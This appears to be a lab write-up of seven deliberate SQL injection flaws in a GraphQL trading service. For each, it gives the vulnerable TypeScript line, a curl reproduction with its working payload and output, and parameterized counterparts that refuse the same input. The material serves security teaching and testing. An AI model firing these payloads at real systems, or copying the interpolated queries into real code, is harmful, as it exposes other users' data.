# SQL injection in `trading` (SQL-001 to SQL-007)

**Family:** `SQL` · **Service:** `trading` · **Surface:** GraphQL · **Scanner:** SAST · **OWASP:** A03 · API3

Seven ways the same mistake appears in one service: a template literal taken for a
prepared statement. The beliefs are named, because each author was sure they had
written a bound query:

| ID | What the author believed | The operation | CWE |
| --- | --- | --- | --- |
| SQL-001 | "Backticks bind." | `orderLookup(id: String!)` | CWE-89 |
| SQL-002 | "The query builder parameterizes." | `tradeHistory(input: TradeHistoryInput!)` | CWE-89 |
| SQL-003 | "It is only a search box." | `searchMarkets(q: String!)` | CWE-89 |
| SQL-004 | "A column name cannot be a parameter, so any name will do." | `tradesSorted(symbol, sortBy, sortDir)` | CWE-89 |
| SQL-005 | "A tag makes it safe." | `volumeFor(symbol: String!)` | CWE-89 |
| SQL-006 | "It calls `execute()`, so it is a prepared statement." | `feesPaid(symbol: String!)` | CWE-89 |
| SQL-007 | "A list cannot be bound." | `ordersByIds(ids: [ID!]!)` | CWE-89 |

Every reproduction below was run on 2026-11-27 against the service alone, on
`127.0.0.1:4202`, through the HTTP/1.1 relay the lab opens on `127.0.0.1:4212`
(`trading` speaks HTTP/2 in cleartext, which curl cannot send). `$A` is Alice's
token, `$B` Bob's. The fake data is the seed: ten resting orders, fifteen trades.

## SQL-001 — `orderLookup`: an untagged template literal

The line (`apps/trading/src/orders/order-lookup.resolver.ts`):

```ts
// SQL-001 / CWE-89: an untagged template literal is concatenation; the id arrives as SQL text, not as a value
const query = `SELECT ... FROM orders WHERE id = ${id} LIMIT 1`;
```

An untagged template literal is string concatenation: the `id` becomes SQL text
before `dataSource.query()` sees it.

```console
$ curl -s $URL/graphql -H 'content-type: application/json' -H "authorization: Bearer $B" -d @sql001.json
{"data":{"orderLookup":{"id":"1","userId":"u-alice","symbol":"BTC-USD"}}}
```

with `sql001.json` holding `{"query":"query($id: String!) { orderLookup(id: $id) { id userId symbol } }","variables":{"id":"1 OR 1=1"}}`.
Bob gained Alice's order: the payload is not an identifier at all, and the query
answered as though it were.

**Counterpart 1 — `order(id: ID!)`, the repository.** The same payload is refused
before the store is asked: `"1 OR 1=1"` is not a whole number, `BAD_USER_INPUT`,
`"An order is asked for by its number: \"1 OR 1=1\" is not one"`. A number that is
stored is then checked against the caller.

**Counterpart 2 — `orderByReference(ref: String!)`, raw SQL with `?`.** The payload
travels as a parameter; no row carries it as a reference, `NOT_FOUND`.

## SQL-002 — `tradeHistory`: a `where` built by concatenation

The line (`apps/trading/src/trades/trade-history.resolver.ts`):

```ts
// SQL-002 / CWE-89: a raw fragment of the query builder is still SQL text; the values were concatenated into it
const where = `t.symbol = '${input.symbol ?? ''}' AND t.side = '${input.side ?? ''}'`;
```

A raw fragment handed to the builder's `where()` is SQL text; the builder binds
only what is passed as a parameter.

```console
$ curl -s $URL/graphql -H 'content-type: application/json' -H "authorization: Bearer $A" -d @sql002.json   # symbol "BTC-USD' OR '1'='1", side BUY
{"data":{"tradeHistory":[{"id":"1","symbol":"BTC-USD","side":"BUY"},{"id":"2","symbol":"BTC-USD","side":"SELL"},
 {"id":"3","symbol":"BTC-USD","side":"BUY"},{"id":"4","symbol":"ETH-USD","side":"BUY"},{"id":"6","symbol":"ETH-USD","side":"BUY"},
 ... eleven rows, across ETH-USD, SOL-USD, XRP-USD and DOGE-USD ...]}}
```

Alice gained the whole BUY side and BTC-USD besides — eleven rows for a symbol
string that matches no market at all.

**Counterpart 1 — `trades(symbol)`, an object-literal filter.** `.where({ symbol })`
binds the whole string: the answer is `[]`.

**Counterpart 2 — `tradesNamed(symbol)`, named parameters.** `.setParameter('symbol', …)`:
the answer is `[]`.

## SQL-003 — `searchMarkets`: a `LIKE` pattern concatenated

The line (`apps/trading/src/markets/search-markets.resolver.ts`):

```ts
// SQL-003 / CWE-89: the LIKE pattern is concatenated, so the caller writes the condition, not just the text
.where(`m.symbol LIKE '%${q}%'`)
```

```console
$ curl -s $URL/graphql -H 'content-type: application/json' -d @sql003.json   # q "zzz' OR 1=1 -- "
{"data":{"searchMarkets":[{"symbol":"BTC-USD"},{"symbol":"DOGE-USD"},{"symbol":"ETH-USD"},{"symbol":"SOL-USD"},{"symbol":"XRP-USD"}]}}
```

All five markets, for text no symbol contains.

**Counterpart 1 — `markets(q)`, a bound pattern.** The service builds
`%${escapeLike(q)}%` itself and binds it; the answer is `[]`.

**Counterpart 2 — `marketsByAssets(assets)`, an enum list.** The schema refuses
the string before any code runs: `"Variable \"$assets\" got invalid value … does
not exist in \"Asset\" enum"`, `BAD_USER_INPUT`.

## SQL-004 — `tradesSorted`: a caller-controlled sort column

The line (`apps/trading/src/trades/trades-sorted.resolver.ts`):

```ts
// SQL-004 / CWE-89: a column name cannot be a parameter, but any string handed to orderBy is taken as one
.orderBy(`t.${sortBy}`, direction)
```

An identifier cannot be a parameter, so it must be chosen — here it is accepted.
The payload turns the sort key into a correlated subquery on Erin's wallet:

```console
$ curl -s $URL/graphql -H 'content-type: application/json' -d @sql004.json
# sortBy "id * (SELECT CASE WHEN w.balance > 40000 THEN -1 ELSE 1 END FROM wallets w
#         WHERE w.userId = 'u-erin' AND w.asset = 'USD')", sortDir ASC
{"data":{"tradesSorted":[{"id":"3"},{"id":"2"},{"id":"1"}]}}
```

The ids came back reversed under an ascending sort: the CASE took its `-1` branch,
which it takes only above 400.00 dollars. The order of the answer says Erin's
balance is above 400.00 — blind inference, no row read.

**Counterpart 1 — `trades(orderBy: TradeOrderBy)`.** A column is chosen from an
enum; the schema refuses the payload: `"Variable \"$orderBy\" got invalid value …"`,
`BAD_USER_INPUT`.

**Counterpart 2 — `tradesNamed`.** Its order is fixed (newest first); `sortBy` is
not an argument of it. The same symbol answers `1, 2, 3`.

## SQL-005 — `volumeFor`: a tag that escapes quotes and joins

The lines (`apps/trading/src/markets/volume-for.resolver.ts`):

```ts
// SQL-005 / CWE-89: escaping quotes is not binding; a backslash before the escaped quote escapes the escape
const query = sqlText`SELECT SUM(quantity) AS volume FROM trades WHERE symbol = '${symbol}'`;
```

`sqlText` is a tag kept from before the one that parameterizes: it escapes the
quotes in a value and joins the pieces back into one string. A backslash sent
before a quote escapes the escape: the quote closes the string with the backslash
inside it, and the rest of the payload is SQL.

```console
$ curl -s $URL/graphql -H 'content-type: application/json' -d @sql005.json   # symbol "\' OR 1=1 -- "
{"data":{"volumeFor":"3907.40000000"}}
```

BTC-USD holds 0.2 BTC of trades; every market together holds 3907.4. The volume
of every market was added and returned.

**Counterpart 1 — `highPrice(symbol)`, the same query shape through `sql`, the tag
that parameterizes.** The text keeps its `?`, the value travels as a parameter:
`NOT_FOUND`, `"There is no trade of \\' OR 1=1 -- "`.

**Counterpart 2 — `markets(q)`.** The text is bound and the wildcards escaped:
`[]`.

## SQL-006 — `feesPaid`: `execute()` on an interpolated string

The line (`apps/trading/src/trades/fees-paid.resolver.ts`):

```ts
// SQL-006 / CWE-89: execute() prepares whatever string it is handed; this one was built by interpolation, with no placeholder and no parameter
const query = `SELECT SUM(fee) AS fees FROM trades WHERE userId = '${caller}' AND symbol = '${symbol}'`;
```

`execute()` prepares whatever it is handed. There is no placeholder here, and no
parameter: the call prepares the attacker's SQL.

```console
$ curl -s $URL/graphql -H 'content-type: application/json' -H "authorization: Bearer $A" -d @sql006.json   # symbol "' OR '1'='1"
{"data":{"feesPaid":"66.67"}}
```

Alice's own fees are 11.15; every user's together are 66.67. The fees of users she
has nothing to do with were added and returned.

**Counterpart 1 — `settlementPrice(symbol)`, `execute()` with the text and the
parameters of `sql`.** A real prepared statement: `NOT_FOUND`.

**Counterpart 2 — `orderByReference(ref)`, raw SQL with `?`.** `NOT_FOUND`.

## SQL-007 — `ordersByIds`: an `IN (…)` list joined from the ids

The line (`apps/trading/src/orders/orders-by-ids.resolver.ts`):

```ts
// SQL-007 / CWE-89: the ids are joined into IN (...); the list is already outside any quote, so nothing has to be escaped
const query = `SELECT ... WHERE userId = '${caller}' AND id IN (${ids.join(', ')})`;
```

```console
$ curl -s $URL/graphql -H 'content-type: application/json' -H "authorization: Bearer $B" -d @sql007.json   # ids ["0) OR (1=1"]
{"data":{"ordersByIds":[{"id":"1","userId":"u-alice"},{"id":"2","userId":"u-bob"},...,{"id":"10","userId":"u-erin"}]}}
```

All ten orders, every user's, to Bob.

**Counterpart 1 — `ordersAmong(ids)`.** The same list is bound with `In`, and the
caller is bound beside it: the answer is `[]`.

**Counterpart 2 — `orderByReference(ref)`.** One `?` for the one value:
`NOT_FOUND`.

## The tests

`apps/trading/test/scenarios/sql.int-spec.ts` — one `describe` per scenario, one
payload per `describe`, sent as written to the vulnerable operation and to each
protected counterpart. The exploit assertion names what was gained; the
counterpart assertion names why it was refused. The Postman collection
`postman/trading/` carries one request per scenario in its `SQL` folder.

## Scope of the counterparts

Each counterpart claim is scoped: this pattern defeats this payload, sent as
written to that operation. Nothing here says any operation is secure in general.
